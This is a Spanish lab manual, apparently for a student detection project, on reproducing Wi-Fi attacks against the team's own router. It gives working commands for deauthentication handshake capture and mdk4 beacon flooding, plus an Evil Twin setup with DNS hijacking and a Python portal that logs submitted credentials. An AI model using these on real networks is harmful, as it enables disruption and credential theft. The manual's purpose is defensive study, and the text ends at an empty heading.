\documentclass[11pt,a4paper]{article}

\newcommand{\doctitle}{Manual de Laboratorio}
\newcommand{\docsubtitle}{WARDEN - Wireless Attack Reproduction and Detection Environment}

\usepackage{warden-style}

% Paquete extra para bloques de codigo
\usepackage{listings}
\lstdefinestyle{wardenshell}{
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{wardenhighlight},
  frame=single,
  rulecolor=\color{wardenrule},
  framesep=4pt,
  framerule=0.4pt,
  xleftmargin=8pt,
  xrightmargin=8pt,
  breaklines=true,
  breakatwhitespace=false,
  keepspaces=true,
  showstringspaces=false,
  literate=
    {á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'\i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1
    {Á}{{\'A}}1 {É}{{\'E}}1 {Í}{{\'I}}1 {Ó}{{\'O}}1 {Ú}{{\'U}}1
    {ñ}{{\~n}}1 {Ñ}{{\~N}}1 {¿}{{?`}}1 {¡}{{!`}}1
}
\lstset{style=wardenshell}

\begin{document}

% -- Portada -------------------------------------------------------------------
\wardencoverpage{0.1}{Abril 2026}{Borrador}

% -- Historial de Revisiones ---------------------------------------------------
\begin{wardenrevisions}
\revrow{0.1}{Abril 2026}{Santiago Valencia León}{Borrador inicial}
\revrow{0.1}{Abril 2026}{Daniel Yadir Perea Murillo}{Borrador inicial}
\revrow{0.1}{Abril 2026}{Sofia Valdez Londono}{Borrador inicial}
\end{wardenrevisions}

% -- Tabla de Contenidos -------------------------------------------------------
\tableofcontents
\newpage

% ==============================================================================
\section{Introducción}
% ==============================================================================

\subsection{Propósito del documento}
Este documento es una guía práctica paso a paso para que cualquier integrante
del equipo WARDEN pueda, sin ayuda externa, validar el adaptador Panda
PAU0B AC600 y ejecutar manualmente los tres ataques que el proyecto va a
automatizar posteriormente desde la ESP32.

El objetivo es triple:

\begin{enumerate}
  \item \textbf{Validar el hardware.} Confirmar que el Panda funciona
    correctamente bajo Linux y soporta modo monitor, capacidad
    indispensable para todo el proyecto.
  \item \textbf{Familiarizarse con el ataque.} Ejecutar manualmente cada
    ataque que la ESP32 va a reproducir. Ver ``con las propias manos'' cómo
    se comporta cada uno hace que después sea mucho más fácil entender el
    código del firmware ofensivo y del detector.
  \item \textbf{Generar capturas de referencia.} Cada ataque manual genera
    archivos PCAP que pueden usarse luego para desarrollar y probar el
    detector sin necesidad de tener el Panda conectado.
\end{enumerate}

\subsection{Lectura previa requerida}
Este documento asume que ya leíste \emph{WARDEN - Fundamentos Técnicos}.
Si los términos \emph{frame de gestión}, \emph{beacon}, \emph{BSSID},
\emph{modo monitor}, \emph{deauth}, \emph{handshake} no te suenan
familiares, vuelve primero a ese documento.

\subsection{Plataforma de referencia}
Los comandos de este manual están escritos para Arch Linux, aunque la
mayoría funcionan idénticamente en cualquier distribución reciente
(Ubuntu, Debian, Fedora). Donde haya diferencias, se indicarán.

\subsection{Recordatorio ético y legal}
Los ataques documentados aquí solo deben ejecutarse contra:

\begin{itemize}
  \item El router de laboratorio adquirido específicamente para WARDEN.
  \item Dispositivos de propiedad del equipo de desarrollo (Redmi Note 7,
    Dell Latitude E6220, o cualquier otro autorizado).
\end{itemize}

Bajo ninguna circunstancia se ejecutan estos ataques contra redes,
dispositivos o usuarios ajenos al proyecto. La Ley 1273 de 2009 tipifica
estas actividades como delito cuando se realizan sin autorización.

% ==============================================================================
\section{Paso 0: Renombrar la interfaz a \texttt{panda0}}
% ==============================================================================

\subsection{Por qué renombrar}
Cuando se conecta el Panda al USB, Linux le asigna un nombre largo e
impredecible como \texttt{wlp101s0f0u1} basado en el bus USB donde se
conectó. Este nombre \textbf{cambia si conectas el Panda a otro puerto
USB}, lo cual rompe scripts y confunde al equipo. Vamos a configurar
Linux para que siempre llame \texttt{panda0} a este adaptador específico,
sin importar el puerto.

\subsection{Obtener la MAC permanente del adaptador}
Primero necesitamos la dirección MAC verdadera grabada en el chip (no la
aleatoria que Linux le asigna por privacidad).

Con el Panda conectado, ejecuta:

\begin{lstlisting}
ip link show
\end{lstlisting}

Identifica el nombre actual del Panda (algo como \texttt{wlp101s0f0u1}).
Después ejecuta:

\begin{lstlisting}
ethtool -P wlp101s0f0u1
\end{lstlisting}

(Sustituye \texttt{wlp101s0f0u1} por el nombre real que viste arriba.)

\textbf{Salida esperada:}

\begin{lstlisting}
Permanent address: 00:c0:ca:XX:XX:XX
\end{lstlisting}

Anota esa MAC. La necesitamos en el siguiente paso.

\subsection{Crear la regla udev}
\texttt{udev} es el subsistema de Linux que reacciona a eventos de
hardware. Le vamos a pedir que cuando aparezca un adaptador con la MAC
del Panda, lo renombre a \texttt{panda0}.

Crea el archivo:

\begin{lstlisting}
sudo nvim /etc/udev/rules.d/70-panda-wifi.rules
\end{lstlisting}

Pega esta línea (sustituyendo la MAC con la que obtuviste):

\begin{lstlisting}
SUBSYSTEM==``net'', ACTION==``add'', ATTR{address}==``00:c0:ca:XX:XX:XX'', NAME=``panda0''
\end{lstlisting}

Guarda y cierra (\texttt{:wq} en nvim).

\subsection{Aplicar la regla}

\begin{lstlisting}
sudo udevadm control --reload-rules
sudo udevadm trigger
\end{lstlisting}

Si el adaptador ya estaba conectado, lo más confiable es desconectarlo
del USB y volverlo a conectar. Verifica con:

\begin{lstlisting}
ip link | grep panda
\end{lstlisting}

Debería aparecer \texttt{panda0:} algo. \textbf{De aquí en adelante todos
los comandos usan \texttt{panda0} como nombre.}

% ==============================================================================
\section{Paso 1: Instalación de herramientas}
% ==============================================================================

\subsection{Qué vamos a instalar y para qué}

\begin{datatable}{L{2.8cm} L{13cm}}{Herramienta & Propósito}
\drow{\texttt{iw}            & Utilidad oficial moderna del kernel para gestionar interfaces inalámbricas. Permite listar interfaces, ver capacidades del chipset, cambiar modo, fijar canales.}
\drow{\texttt{aircrack-ng}   & Suite de auditoría WiFi con varias herramientas. Las que usamos: \texttt{airodump-ng} (escaneo y captura) y \texttt{aireplay-ng} (inyección de frames).}
\drow{\texttt{wireshark-qt}  & Analizador gráfico de protocolos. Permite capturar tráfico en vivo o abrir archivos PCAP y visualizar cada frame con su estructura completa.}
\drow{\texttt{tcpdump}       & Capturador de paquetes minimalista en línea de comandos. Útil para validaciones rápidas.}
\drow{\texttt{mdk4}          & Herramienta especializada en ataques a frames de gestión 802.11. La usaremos para Beacon Flooding. Disponible en AUR.}
\drow{\texttt{ethtool}       & Utilidad para consultar y configurar parámetros de bajo nivel de interfaces de red. La usamos para obtener la MAC permanente.}
\drow{\texttt{hostapd}       & Daemon que convierte una interfaz WiFi en Access Point. Lo usaremos para el Evil Twin manual.}
\drow{\texttt{dnsmasq}       & Servidor ligero combinado de DHCP y DNS. Lo usaremos para asignar IPs a las víctimas que se conecten al Evil Twin y para redirigir todas las consultas DNS al portal cautivo.}
\end{datatable}

\subsection{Comandos de instalación en Arch Linux}

\begin{lstlisting}
sudo pacman -S --needed iw aircrack-ng wireshark-qt tcpdump ethtool hostapd dnsmasq
yay -S mdk4
\end{lstlisting}

\textbf{Equivalente en Ubuntu/Debian:}

\begin{lstlisting}
sudo apt install iw aircrack-ng wireshark tcpdump ethtool hostapd dnsmasq mdk4
\end{lstlisting}

\subsection{Permisos para Wireshark}
Durante la instalación, el paquete pregunta si los usuarios sin
privilegios de root deben poder capturar tráfico. Acepta esto. Después,
agrega tu usuario al grupo \texttt{wireshark}:

\begin{lstlisting}
sudo usermod -aG wireshark $USER
\end{lstlisting}

\textbf{Por qué:} correr Wireshark como root es mala práctica de
seguridad. Wireshark dissecta cientos de protocolos, y un bug en alguno
de esos parsers ejecutándose como root sería catastrófico.

El cambio de grupo solo aplica después de cerrar sesión y volver a
iniciarla, o reiniciar el equipo.

% ==============================================================================
\section{Paso 2: Verificación de hardware y driver}
% ==============================================================================

Aquí confirmamos tres cosas, en orden ascendente de capa: que el adaptador
está conectado físicamente al USB, que el kernel cargó el driver correcto,
y que existe como interfaz wireless lista para usar.

\subsection{Verificación a nivel USB}

\begin{lstlisting}
lsusb
\end{lstlisting}

\textbf{Qué hace:} lista todos los dispositivos USB conectados. Buscamos
el chipset MediaTek MT7610U.

\textbf{Salida esperada:}

\begin{lstlisting}
Bus 003 Device 004: ID 0e8d:7610 MediaTek Inc. WiFi
\end{lstlisting}

\textbf{Cómo interpretarla:}

\begin{itemize}
  \item \texttt{0e8d} es el ID asignado a MediaTek por el consorcio USB-IF.
  \item \texttt{7610} es el ID del producto MT7610U.
\end{itemize}

Si esta línea no aparece, el problema es físico: cable USB defectuoso,
puerto dañado o adaptador mal insertado. Prueba otro puerto antes de
seguir.

\subsection{Verificación de carga del driver}

\begin{lstlisting}
sudo dmesg | grep -i mt76
\end{lstlisting}

\textbf{Qué hace:} \texttt{dmesg} imprime el buffer de mensajes del
kernel. Cuando se conecta el USB, el kernel intenta cargar el driver y
registra cada paso. Filtramos por \texttt{mt76} para ver solo lo relevante.

\textbf{Salida esperada (parcial):}

\begin{lstlisting}
mt76x0u 3-1:1.0: ASIC revision: 76100002 MAC revision: 76502000
mt76x0u 3-1:1.0: EEPROM ver:01 fae:08
usbcore: registered new interface driver mt76x0u
mt76x0u 3-1:1.0 panda0: renamed from wlan0
\end{lstlisting}

La última línea (\texttt{renamed from wlan0}) confirma que la regla
\texttt{udev} del Paso 0 funcionó.

\subsection{Verificación a nivel de interfaz wireless}

\begin{lstlisting}
iw dev
\end{lstlisting}

\textbf{Qué hace:} lista todas las interfaces wireless registradas en el
kernel, agrupadas por dispositivo físico (\texttt{phy}).

\textbf{Salida esperada (parcial):}

\begin{lstlisting}
phy#1
    Interface panda0
        type managed
        addr 2e:6b:01:d4:9a:17
phy#0
    Interface wlp98s0
        ssid MiRedDeCasa
        type managed
        addr 58:cd:c9:3c:0d:a5
\end{lstlisting}

Aparecen dos \texttt{phy}: el de la WiFi interna de la laptop y el del
Panda (\texttt{panda0}). El Panda aparece en \texttt{type managed} por
defecto. Lo cambiaremos a monitor en el Paso 4.

% ==============================================================================
\section{Paso 3: Verificación de capacidades del chipset}
% ==============================================================================

Tener el adaptador conectado y reconocido no garantiza que soporte modo
monitor. Hay que consultarlo explícitamente al driver.

\begin{lstlisting}
iw phy phy1 info | grep -A 10 ``Supported interface modes''
\end{lstlisting}

\textbf{Qué hace:} consulta el dispositivo físico \texttt{phy1} (el del
Panda según \texttt{iw dev}) y filtra la sección de modos soportados. La
opción \texttt{-A 10} de \texttt{grep} incluye las 10 líneas siguientes
al match.

\textbf{Salida esperada:}

\begin{lstlisting}
Supported interface modes:
    * IBSS
    * managed
    * AP
    * AP/VLAN
    * monitor
    * mesh point
    * P2P-client
    * P2P-GO
\end{lstlisting}

\textbf{Lo crítico:} que aparezca \texttt{monitor} en la lista. Si no
aparece, el proyecto WARDEN no es viable con este adaptador. En este
caso aparece, junto con \texttt{AP} (que necesitaremos para la fase de
Evil Twin manual).

% ==============================================================================
\section{Paso 4: Activación del modo monitor}
% ==============================================================================

\subsection{La operación crítica del setup}
Aquí cambiamos el adaptador de modo \emph{managed} (cliente normal) a
modo \emph{monitor} (oyente pasivo del aire).

\begin{lstlisting}
sudo ip link set panda0 down
sudo iw dev panda0 set type monitor
sudo ip link set panda0 up
sudo iw dev panda0 set channel 6
\end{lstlisting}

\textbf{Explicación de cada comando:}

\begin{enumerate}
  \item \texttt{sudo ip link set panda0 down} - Desactiva la interfaz a
    nivel kernel. Es necesario porque no se puede cambiar el tipo de
    interfaz mientras está activa. Solo afecta esta interfaz; la WiFi
    interna sigue funcionando.
  \item \texttt{sudo iw dev panda0 set type monitor} - El comando
    central. Le indica al driver que cambie el modo. A partir de aquí,
    el adaptador entrega al kernel todos los frames 802.11 que reciba,
    sin filtrar por destinatario.
  \item \texttt{sudo ip link set panda0 up} - Reactiva la interfaz, ya
    en modo monitor.
  \item \texttt{sudo iw dev panda0 set channel 6} - Sintoniza el
    adaptador en el canal 6 (2437 MHz). \textbf{El canal debe coincidir
    con el del router de laboratorio cuando esté configurado.}
\end{enumerate}

\subsection{Importante: persistencia}
\textbf{Estos cambios no son persistentes.} Si reinicias el sistema,
desconectas el USB del Panda, o el sistema entra en suspensión, el
adaptador vuelve a \texttt{managed}. En cada sesión hay que volver a
ejecutar la secuencia.

\subsection{Verificación}

\begin{lstlisting}
iw dev panda0 info
\end{lstlisting}

\textbf{Salida esperada (parcial):}

\begin{lstlisting}
Interface panda0
    addr 4a:c9:7b:ce:34:46
    type monitor
    channel 6 (2437 MHz), width: 20 MHz (no HT)
    txpower 9.00 dBm
\end{lstlisting}

\texttt{type monitor} y \texttt{channel 6} confirman éxito.

\subsection{Revertir al estado normal}
Al terminar las pruebas:

\begin{lstlisting}
sudo ip link set panda0 down
sudo iw dev panda0 set type managed
sudo ip link set panda0 up
\end{lstlisting}

% ==============================================================================
\section{Paso 5: Validación end-to-end de la captura}
% ==============================================================================

\subsection{Validación rápida con tcpdump}

\begin{lstlisting}
sudo tcpdump -i panda0 -c 20 -e
\end{lstlisting}

\textbf{Flags:}

\begin{itemize}
  \item \texttt{-i panda0} - interfaz a escuchar.
  \item \texttt{-c 20} - capturar 20 paquetes y terminar.
  \item \texttt{-e} - mostrar encabezados de capa de enlace (capa 2).
\end{itemize}

\textbf{Lo esperado:} líneas con timestamp, frecuencia, RSSI y descripción
del frame:

\begin{lstlisting}
22:13:45.123 1.0 Mb 2437 MHz 11b -56dB signal Beacon (MiRed) [...] CH: 6
\end{lstlisting}

Si los 20 paquetes llegan en pocos segundos, la captura funciona.

\subsection{Captura completa con Wireshark}

\begin{lstlisting}
wireshark
\end{lstlisting}

(o desde el menú de tu entorno gráfico)

\textbf{Pasos:}

\begin{enumerate}
  \item Doble clic en la interfaz \texttt{panda0} para iniciar captura.
  \item La pantalla se llena de frames 802.11. Verás:
    \begin{itemize}
      \item \texttt{802.11 Beacon frame} - cada AP emite unos 10 por
        segundo.
      \item \texttt{802.11 Probe Request} - clientes buscando redes
        conocidas.
      \item \texttt{802.11 Probe Response} - APs respondiendo.
      \item \texttt{802.11 Acknowledgment} - ACKs de capa 2.
    \end{itemize}
  \item Filtros útiles para escribir en la barra de filtros:
\end{enumerate}

\textbf{Solo beacons (todas las redes visibles):}

\begin{lstlisting}
wlan.fc.type_subtype == 0x08
\end{lstlisting}

\textbf{Solo deauths (en condiciones normales casi cero; el detector
busca anomalías aquí):}

\begin{lstlisting}
wlan.fc.type_subtype == 0x0c
\end{lstlisting}

\textbf{Tráfico de un BSSID específico:}

\begin{lstlisting}
wlan.bssid == aa:bb:cc:dd:ee:ff
\end{lstlisting}

\textbf{Vista resumen de redes:} menú \texttt{Wireless} $\rightarrow$
\texttt{WLAN Traffic}. Tabla con todas las redes detectadas, BSSID, SSID,
canal, conteo de paquetes.

\textbf{Guardar la captura:} \texttt{File} $\rightarrow$ \texttt{Save As}
$\rightarrow$ archivo con extensión \texttt{.pcapng}. Conviene guardar
todas las capturas como evidencia y como insumo para que los compañeros
desarrollen el detector sin necesidad de tener el Panda.

% ==============================================================================
\section{Ataque manual 1: Captura de handshake WPA2 con deauth}
% ==============================================================================

\subsection{¿Qué vamos a hacer?}
Vamos a forzar a un cliente conectado a la red de laboratorio a
reconectarse, y en esa reconexión vamos a capturar el handshake WPA2 de 4
vías. La técnica usa dos comandos: uno escuchando, otro inyectando
deauths.

\textbf{Aclaración:} en WARDEN no vamos a crackear la contraseña a partir
del handshake. El objetivo aquí es solamente \emph{ver el deauth en
acción} y entender qué evidencia deja, porque ese es el ataque que el
detector debe identificar en la fase 2 de la cadena.

\subsection{Preparación: identificar la red objetivo}
Con \texttt{panda0} en modo monitor, ejecuta:

\begin{lstlisting}
sudo airodump-ng panda0
\end{lstlisting}

\textbf{Qué hace:} muestra en tiempo real una tabla con todos los APs y
clientes en el aire. Arriba lista APs, abajo lista clientes (stations).

\textbf{Columnas importantes (sección APs):}

\begin{itemize}
  \item \texttt{BSSID} - MAC del AP.
  \item \texttt{CH} - canal.
  \item \texttt{ENC} - tipo de cifrado (esperamos \texttt{WPA2}).
  \item \texttt{ESSID} - nombre de la red.
\end{itemize}

\textbf{Columnas importantes (sección clientes):}

\begin{itemize}
  \item \texttt{BSSID} - el AP al que está asociado.
  \item \texttt{STATION} - MAC del cliente.
\end{itemize}

Deja correr unos 30 segundos para que aparezcan clientes activos. Después
\texttt{Ctrl+C}.

\textbf{Anota:}

\begin{itemize}
  \item BSSID del router de laboratorio.
  \item Canal del router.
  \item MAC de un cliente conectado (típicamente, el celular Redmi Note 7
    o la laptop Dell asociados a la red).
\end{itemize}

\subsection{Enfocar la captura en la red objetivo}
Ahora capturamos solo el tráfico del router de laboratorio:

\begin{lstlisting}
sudo airodump-ng --bssid <BSSID-DEL-ROUTER> -c <CANAL> -w handshake panda0
\end{lstlisting}

Sustituye \texttt{<BSSID-DEL-ROUTER>} y \texttt{<CANAL>} por los valores
que anotaste.

\textbf{Flags:}

\begin{itemize}
  \item \texttt{--bssid} - filtra por la MAC del router.
  \item \texttt{-c} - canal (debe coincidir con el del router).
  \item \texttt{-w handshake} - prefijo del archivo de salida. Se
    generarán \texttt{handshake-01.cap}, \texttt{handshake-01.csv}, etc.
\end{itemize}

\textbf{Deja corriendo en esta terminal.} Aquí aparecerá el handshake
cuando lo capturemos.

\subsection{Forzar el handshake con deauth}
Abre \textbf{otra terminal} (sin cerrar la anterior) y ejecuta:

\begin{lstlisting}
sudo aireplay-ng --deauth 5 -a <BSSID-DEL-ROUTER> -c <MAC-DEL-CLIENTE> panda0
\end{lstlisting}

\textbf{Flags:}

\begin{itemize}
  \item \texttt{--deauth 5} - enviar 5 frames de deauth.
  \item \texttt{-a} - BSSID del router.
  \item \texttt{-c} - MAC del cliente objetivo.
\end{itemize}

\textbf{Qué pasa:} \texttt{aireplay-ng} inyecta frames que aparentan
venir del router (con el BSSID falsificado) diciéndole al cliente
``desconéctate''. El cliente obedece y automáticamente intenta
reconectarse, y en esa reconexión incluye el handshake.

\subsection{Verificar que el handshake fue capturado}
Vuelve a la terminal de \texttt{airodump-ng}. Si funcionó, en la
\textbf{esquina superior derecha} aparecerá:

\begin{lstlisting}
[ WPA handshake: <BSSID-DEL-ROUTER> ]
\end{lstlisting}

Si no aparece, repite el \texttt{aireplay-ng} con más paquetes
(\texttt{--deauth 20}). Si sigue sin aparecer, posibles causas:

\begin{itemize}
  \item El cliente está demasiado lejos del Panda (señal débil).
  \item El cliente no se reconectó (intenta con otro cliente).
  \item PMF (802.11w) está activo en el router. Verifica la configuración
    del router de laboratorio y desactívalo si es necesario.
\end{itemize}

Cuando aparezca, \texttt{Ctrl+C} en \texttt{airodump-ng}. Habrá varios
archivos generados; el que nos interesa es \texttt{handshake-01.cap}.

\subsection{Confirmar el handshake con aircrack-ng}

\begin{lstlisting}
aircrack-ng handshake-01.cap
\end{lstlisting}

\textbf{Salida esperada:}

\begin{lstlisting}
Opening handshake-01.cap
Read 12345 packets.

   #  BSSID              ESSID            Encryption
   1  E4:AB:89:D6:9B:80  LAB_WARDEN_UTP   WPA (1 handshake)
\end{lstlisting}

\textbf{\texttt{WPA (1 handshake)}} confirma que la captura contiene un
handshake válido.

\subsection{Lo que aprendimos}
Acabamos de ejecutar la \textbf{Fase 2 de la cadena WARDEN}
(Deauthentication) de forma manual. Lo importante es entender qué
evidencia dejaste en el aire:

\begin{itemize}
  \item Frames de deauth originados desde una MAC que suplanta al
    router legítimo.
  \item Reconexión inmediata del cliente con su handshake WPA2 visible.
\end{itemize}

\textbf{Esa es exactamente la firma que el detector de WARDEN debe
identificar.} Guarda el archivo \texttt{handshake-01.cap} - es una
referencia útil para el desarrollo del detector.

% ==============================================================================
\section{Ataque manual 2: Beacon Flooding}
% ==============================================================================

\subsection{¿Qué vamos a hacer?}
Vamos a usar la herramienta \texttt{mdk4} para emitir miles de beacons
falsos por segundo, anunciando redes inexistentes. Esto reproduce la
\textbf{Fase 1 de la cadena WARDEN} (Beacon Flooding).

\subsection{Preparación}
\texttt{panda0} debe estar en modo monitor (Paso 4). No es estrictamente
necesario fijar canal si vamos a dejar que \texttt{mdk4} brinque entre
ellos, pero para que el ataque sea reproducible y detectable lo
emitiremos en el canal del router de laboratorio.

\subsection{Lanzar el beacon flood}

\begin{lstlisting}
sudo mdk4 panda0 b -n ``FakeNet'' -c 6
\end{lstlisting}

\textbf{Flags:}

\begin{itemize}
  \item \texttt{panda0} - interfaz en modo monitor.
  \item \texttt{b} - modo ``beacon flood'' de mdk4.
  \item \texttt{-n ``FakeNet''} - prefijo de los SSIDs falsos. Se generan
    \texttt{FakeNet}, \texttt{FakeNet1}, \texttt{FakeNet2}, etc.
  \item \texttt{-c 6} - canal donde emitir.
\end{itemize}

\textbf{Variantes útiles:}

\begin{lstlisting}
# Flood con SSIDs completamente aleatorios
sudo mdk4 panda0 b -c 6

# Flood con SSIDs leídos de un archivo (uno por línea)
sudo mdk4 panda0 b -f lista-ssids.txt -c 6

# Flood emitiendo redes que aparentan estar protegidas con WPA2
sudo mdk4 panda0 b -w -c 6
\end{lstlisting}

Deja corriendo unos 5 a 10 segundos y \texttt{Ctrl+C} para parar. Más
tiempo no es necesario para validar el ataque y satura el aire
innecesariamente.

\subsection{Verificar que el ataque funciona}
Toma un celular o laptop y abre la lista de redes WiFi. Deberían aparecer
decenas o cientos de redes con nombres tipo \texttt{FakeNet},
\texttt{FakeNet1}, \texttt{FakeNet2}, etc. Esto confirma que los beacons
están siendo recibidos por dispositivos reales.

\subsection{Capturar el ataque con Wireshark}
En paralelo al \texttt{mdk4}, abre Wireshark escuchando en \texttt{panda0}
(el mismo Panda puede capturar y emitir simultáneamente porque el modo
monitor es pasivo y \texttt{mdk4} es activo). Aplica el filtro:

\begin{lstlisting}
wlan.fc.type_subtype == 0x08
\end{lstlisting}

Verás una avalancha de beacons por segundo, mucho mayor a lo normal.
Guarda la captura como \texttt{beacon-flood.pcapng}. Este archivo es
\textbf{muy valioso} para el proyecto: es un ejemplo real del ataque
usable para desarrollar y validar el detector sin relanzar el ataque.

\subsection{Lo que aprendimos}
La firma de detección del Beacon Flooding incluye:

\begin{itemize}
  \item Tasa de beacons únicos por segundo muy superior a lo normal.
  \item Múltiples BSSIDs nuevos apareciendo en intervalos cortos.
  \item En el caso de \texttt{mdk4}, los BSSIDs falsos siguen una
    secuencia que también puede ser una pista.
\end{itemize}

% ==============================================================================
\section{Ataque manual 3: Evil Twin con portal cautivo}
% ==============================================================================

\subsection{¿Qué vamos a hacer?}
Este es el ataque más complejo de los tres y reproduce la \textbf{Fase 3
de la cadena WARDEN} (Evil Twin). Necesitamos:

\begin{enumerate}
  \item Configurar el Panda como Access Point con el mismo SSID que la
    red legítima de laboratorio, pero \emph{sin contraseña}.
  \item Configurar un servidor DHCP para asignar IPs a las víctimas que
    se conecten.
  \item Configurar un servidor DNS que redirija \emph{todas} las consultas
    a nuestra propia IP.
  \item Servir una página web mínima (el portal cautivo) que solicite
    credenciales.
\end{enumerate}

\textbf{Para este ataque necesitamos un segundo adaptador WiFi}, porque
el Panda no puede operar simultáneamente en modo monitor (para captura)
y en modo AP (para el Evil Twin). Lo más práctico es:

\begin{itemize}
  \item Usar la WiFi interna de la laptop como AP del Evil Twin.
  \item Usar el Panda como detector pasivo en modo monitor.
\end{itemize}

Si tu WiFi interna no soporta modo AP, necesitarás un segundo adaptador
USB. Para simplificar, este manual asume que sí lo soporta. Verifica con:

\begin{lstlisting}
iw list | grep -A 10 ``Supported interface modes''
\end{lstlisting}

\textbf{Aclaración importante:} en el proyecto WARDEN final, la ESP32
hará todo esto sola. Aquí lo hacemos manualmente con \texttt{hostapd} +
\texttt{dnsmasq} + un servidor web Python para entender qué hace cada
componente.

\subsection{Configurar hostapd (el AP)}
Crea el archivo \texttt{/tmp/eviltwin-hostapd.conf}:

\begin{lstlisting}
sudo nvim /tmp/eviltwin-hostapd.conf
\end{lstlisting}

Pega este contenido (sustituye \texttt{wlp98s0} por el nombre de tu WiFi
interna que viste en el Paso 2):

\begin{lstlisting}
interface=wlp98s0
driver=nl80211
ssid=LAB_WARDEN_UTP
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
ignore_broadcast_ssid=0
\end{lstlisting}

\textbf{Explicación de cada línea:}

\begin{itemize}
  \item \texttt{interface} - el adaptador que actuará como AP.
  \item \texttt{driver=nl80211} - el driver moderno estándar de Linux.
  \item \texttt{ssid} - el nombre de la red. Debe coincidir con el del
    router legítimo para que sea un Evil Twin convincente.
  \item \texttt{hw\_mode=g} - banda 2.4 GHz.
  \item \texttt{channel=6} - canal donde emitir.
  \item \texttt{auth\_algs=1} - autenticación abierta (sin WPA).
  \item \texttt{ignore\_broadcast\_ssid=0} - el SSID es visible.
\end{itemize}

\subsection{Configurar dnsmasq (DHCP + DNS)}
Crea \texttt{/tmp/eviltwin-dnsmasq.conf}:

\begin{lstlisting}
sudo nvim /tmp/eviltwin-dnsmasq.conf
\end{lstlisting}

Pega:

\begin{lstlisting}
interface=wlp98s0
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
\end{lstlisting}

\textbf{Explicación:}

\begin{itemize}
  \item \texttt{interface=wlp98s0} - escucha en la interfaz del Evil Twin.
  \item \texttt{dhcp-range} - asigna IPs entre \texttt{10.0.0.10} y
    \texttt{10.0.0.50} con duración de 12 horas.
  \item \texttt{dhcp-option=3,10.0.0.1} - el gateway por defecto que
    los clientes recibirán.
  \item \texttt{dhcp-option=6,10.0.0.1} - el servidor DNS que los
    clientes usarán (nosotros).
  \item \texttt{address=/\#/10.0.0.1} - la ``magia'' del portal cautivo:
    cualquier consulta DNS, sin importar el dominio (\texttt{google.com},
    \texttt{facebook.com}, lo que sea) se resuelve a \texttt{10.0.0.1},
    que somos nosotros. Cuando la víctima abra el navegador para ``ir a
    cualquier sitio'', caerá en nuestro portal.
\end{itemize}

\subsection{Configurar la IP del AP}
Antes de levantar \texttt{hostapd}, asignamos la IP \texttt{10.0.0.1} a
la interfaz que actuará como AP:

\begin{lstlisting}
sudo ip addr add 10.0.0.1/24 dev wlp98s0
\end{lstlisting}

\subsection{Crear el portal cautivo (página web mínima)}
Crea un directorio para el portal:

\begin{lstlisting}
mkdir -p ~/eviltwin-portal
cd ~/eviltwin-portal
\end{lstlisting}

Crea el archivo \texttt{index.html}:

\begin{lstlisting}
nvim ~/eviltwin-portal/index.html
\end{lstlisting}

Pega este contenido (es un portal cautivo mínimo, claramente identificado
como demostración educativa):

\begin{lstlisting}
<!DOCTYPE html>
<html lang=``es''>
<head>
  <meta charset=``UTF-8''>
  <title>Re-autenticacion requerida</title>
</head>
<body style=``font-family: sans-serif; max-width: 500px; margin: 50px auto;''>
  <div style=``border: 3px solid red; padding: 10px; margin-bottom: 20px;''>
    <strong>WARDEN - DEMOSTRACION EDUCATIVA</strong><br>
    Este es un portal cautivo falso usado solo para fines educativos.<br>
    No ingreses credenciales reales.
  </div>
  <h1>Re-autenticacion requerida</h1>
  <p>Por favor inicia sesion para continuar usando la red.</p>
  <form action=``/captura'' method=``POST''>
    <p>Usuario: <input type=``text'' name=``usuario'' required></p>
    <p>Contrasena: <input type=``password'' name=``password'' required></p>
    <p><button type=``submit''>Iniciar sesion</button></p>
  </form>
</body>
</html>
\end{lstlisting}

Crea un servidor Python mínimo que sirva la página y registre las
credenciales (\texttt{servidor.py}):

\begin{lstlisting}
nvim ~/eviltwin-portal/servidor.py
\end{lstlisting}

Pega:

\begin{lstlisting}
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import datetime

class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('index.html', 'rb') as f:
            contenido = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(contenido)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode('utf-8')
        datos = parse_qs(body)
        timestamp = datetime.datetime.now().isoformat()
        print(f``[{timestamp}] CREDENCIALES CAPTURADAS:'')
        print(f``  Usuario: {datos.get('usuario', [''])[0]}'')
        print(f``  Password: {datos.get('password', [''])[0]}'')
        print(f``  Cliente IP: {self.client_address[0]}'')
        print(``---'')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b``<h1>Sesion iniciada (demo)</h1>'')

if __name__ == '__main__':
    print(``Portal cautivo de demostracion WARDEN escuchando en 10.0.0.1:80'')
    HTTPServer(('10.0.0.1', 80), PortalHandler).serve_forever()
\end{lstlisting}

\subsection{Lanzar el Evil Twin}
Necesitarás varias terminales, una por cada componente.

\textbf{Terminal 1 - hostapd (el AP):}

\begin{lstlisting}
sudo hostapd /tmp/eviltwin-hostapd.conf
\end{lstlisting}

Verás logs indicando que el AP está activo. Si hay errores, suele ser
por NetworkManager controlando la interfaz. En ese caso, primero:

\begin{lstlisting}
sudo nmcli device set wlp98s0 managed no
\end{lstlisting}

Y vuelve a lanzar \texttt{hostapd}.

\textbf{Terminal 2 - dnsmasq (DHCP+DNS):}

\begin{lstlisting}
sudo dnsmasq -C /tmp/eviltwin-dnsmasq.conf -d
\end{lstlisting}

\textbf{Flags:}

\begin{itemize}
  \item \texttt{-C} - usar el archivo de configuración indicado.
  \item \texttt{-d} - modo ``no daemon'', se queda en primer plano para
    que veas los logs.
\end{itemize}

\textbf{Terminal 3 - servidor del portal cautivo:}

\begin{lstlisting}
cd ~/eviltwin-portal
sudo python3 servidor.py
\end{lstlisting}

Necesita \texttt{sudo} porque el puerto 80 está privilegiado.

\textbf{Terminal 4 (opcional) - captura con Wireshark o tcpdump en
\texttt{panda0} en modo monitor}, para registrar cómo se ve el Evil Twin
desde el aire.

\subsection{Probar el ataque}

